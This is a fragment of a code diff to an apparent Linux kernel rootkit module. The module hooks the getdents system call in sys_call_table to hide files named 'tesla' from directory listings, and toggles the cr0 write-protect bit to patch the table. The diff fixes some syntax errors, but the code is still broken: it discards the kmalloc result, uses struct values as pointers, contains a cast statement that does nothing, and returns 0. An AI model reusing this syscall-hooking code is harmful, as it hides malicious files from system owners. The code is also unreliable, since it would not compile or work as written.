@@ -22,24 +22,23 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 	//call getdents and use the information to filter out tesla files
 	
 	int total_size = orig_getdents( fd , dirp, count);
-	kmalloc(total_size, GFP_KERNEL)
+	kmalloc(total_size, GFP_KERNEL);
 
 	//step 2: copy_from_user(dirp_kernel, dirp, total_size) total_size depends on whether or not tesla file occurs first, remove if first, else hide
-	struct dirent first = dirp_kernel;
+	struct linux_dirent dirp_kernel;
 	copy_from_user(dirp_kernel, dirp, total_size);
 
 	int isNext = 1; //0 for no, 1 for yes
-	char* buff[10];
 	int i = 0;
 	int prevTesla = 0; //0 for no, 1 for yes
-	(struct linux_dirent*)(char *)prev = dirp_kernel;
-	(struct linux_dirent*)(char *)firstEntry;
-
+	struct linux_dirent prev = dirp_kernel;
+	struct linux_dirent next = dirp_kernel;
 	while(isNext == 1){      //while there is a next table entry
 
 		if(((struct linux_dirent*)((char *)next + dirp_kernel->d_reclen)) == NULL){
 			isNext = 0;
 		} else {
+			
 			(struct linux_dirent*)((char *)next + dirp_kernel->d_reclen);
 			unsigned short next_reclen = next->d_reclen;
 		}
@@ -72,7 +71,7 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 	}
 
 	//step 4: copy_to_user(dirp, dirp_kernel, total_size)
-	copy_to_user(dirp, dirp_kernel, total_size;)
+	copy_to_user(dirp, dirp_kernel, total_size);
     return 0;
 }
 
@@ -147,7 +146,7 @@ void tesla_exit(void)
 	/* restore the kill system call to its original version */
 	sys_call_table[__NR_kill] = (long *)orig_kill;
 	sys_call_table[__NR_getdents] = (long *) orig_getdents;
-	
+
 	/* set bit 16 of cr0 */
 	write_cr0(read_cr0() | 0x10000);
 
